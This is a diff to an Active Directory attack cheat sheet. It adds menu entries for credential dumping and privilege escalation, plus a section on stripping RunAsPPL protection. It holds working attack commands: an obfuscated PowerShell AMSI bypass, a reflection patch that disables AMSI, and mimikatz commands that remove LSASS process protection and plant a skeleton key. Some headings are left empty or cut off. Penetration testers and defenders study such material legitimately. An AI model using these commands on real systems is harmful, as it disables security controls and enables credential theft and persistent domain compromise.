@@ -10,14 +10,20 @@ This AD attacks CheatSheet, made by RistBS is inspired by the [Active-Directory-
   - [Summary](#summary)
   - [Tools](#tools)
   - [Hash Cracking](#hash-cracking)
+  - [Domain Enumeration]()
+  - [Local Privilege Escalation]()
+  - [Credentials Dumping]()
+    - [LSASS Dumping]()
+    - [NTDS Dumping]()
+    - [DPAPI 
   - [Brutforce AD Password]()
     - [Custom Username and Password wordlist](custom-username-and-password-wordlist)
   - [RID Cycling]()
   - [Enhanced Security Bypass]()
-    - [AntiMalware Scan Interface (AMSI)]()
-    - [ConstrainLanguageMode (CLM)]()
-    - [Just Enough Administration (JEA)]()
-    - [ExecutionPolicy (EP)]()
+    - [AntiMalware Scan Interface]()
+    - [ConstrainLanguageMode]()
+    - [Just Enough Administration]()
+    - [ExecutionPolicy]()
     - [RunAsPPL for Credentials Dumping]()
   - [MS Exchange]()
     - [OWA Password Spraying]()
@@ -126,6 +132,24 @@ sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) 
 patching AMSI from Powershell6 :
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+  
+### 
+  
+###
+  
+###
+
+### RunAsPPL for Credentials Dumping :
+
+RunAsPPL is an additional LSA protection to prevent reading memory and code injection by non-protected processes.
+
+```bash
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # misc::skeleton
+mimikatz # !-
 ```
 
 
